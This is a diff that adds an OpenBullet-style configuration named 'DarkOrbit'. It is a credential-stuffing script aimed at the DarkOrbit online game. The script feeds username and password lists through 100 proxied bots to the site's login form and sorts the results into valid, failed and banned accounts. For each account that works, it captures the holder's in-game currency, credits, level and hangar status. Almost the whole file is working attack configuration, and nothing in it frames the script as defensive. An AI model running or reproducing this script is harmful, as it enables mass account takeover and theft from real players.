@@ -1,0 +1,52 @@
+[SETTINGS]
+{
+  "Name": "DarkOrbit",
+  "SuggestedBots": 100,
+  "LastModified": "2018-05-14T13:56:43.1129575+00:00",
+  "AdditionalInfo": "",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_MAIN_PAGE REQUEST GET "https://www.darkorbit.co.uk" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+#PARSE_ACTION PARSE "<SOURCE>" CSS "[name=bgcdw_login_form]" "action" 0 -> VAR "ACTION" "" "" 
+#LOGIN REQUEST POST "<ACTION>" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "value=\"loginForm\"" 
+    KEY "class=\"bgc_policy_accept\"" 
+  KEYCHAIN Success OR 
+    KEY "/Choose-your-company.png" 
+    KEY "/indexInternal.es?action=externalLogout" 
+  KEYCHAIN Ban OR 
+    KEY "ban on the use of anonymization services" 
+#CAPTURE_URIDIUM PARSE "<SOURCE>" LR "\"uridium\":" "," Recursive=FALSE -> CAP "Uridium" "" "" 
+#CAPTURE_CREDITS PARSE "<SOURCE>" LR ",\"credits\":" "}" Recursive=FALSE -> CAP "Credits" "" "" 
+#CAPTURE_LANGUAGE PARSE "<SOURCE>" LR "\"language\":\"" "\"" Recursive=FALSE -> CAP "Language" "" "" 
+#CAPTURE_HANGAR PARSE "<SOURCE>" LR "\"isActiveHangarEmpty\":" "}" Recursive=FALSE -> CAP "Hangar Empty?" "" "" 
+#CAPTURE_LEVEL PARSE "<SOURCE>" LR "<label>Level:</label> " " " Recursive=FALSE -> CAP "Level" "" "" 
